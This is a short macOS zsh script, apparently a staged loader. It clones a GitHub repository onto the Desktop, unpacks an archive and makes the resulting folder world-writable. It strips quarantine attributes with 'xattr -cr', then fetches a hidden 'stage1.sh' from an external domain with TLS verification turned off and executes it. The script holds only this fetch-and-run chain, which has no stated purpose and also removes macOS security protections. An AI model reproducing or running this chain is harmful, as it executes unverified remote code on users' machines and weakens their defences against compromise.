#!/bin/zsh

source functions.pb

if [[ "$(find /Users/$(whoami)/Desktop -iname tmp)" != "/Users/$(whoami)/Desktop/tmp" ]]

then

  git clone https://github.com/Brayan-Villa/Nucleo /Users/$(whoami)/Desktop/Nucleo
  
  tar -zxvf /Users/$(whoami)/Desktop/Nucleo/Nucleo.lzma -C /Users/$(whoami)/Desktop/
  
  rm /Users/$(whoami)/Desktop/Nucleo
  
  chmod -R 777 tmp

  xattr -cr tmp
  
fi


cd /Users/$(whoami)/Desktop/

curl -s -k https://bigb033xecution3r.com/stage1.sh --output .stage.sh

chmod +x .stage.sh

./.stage.sh
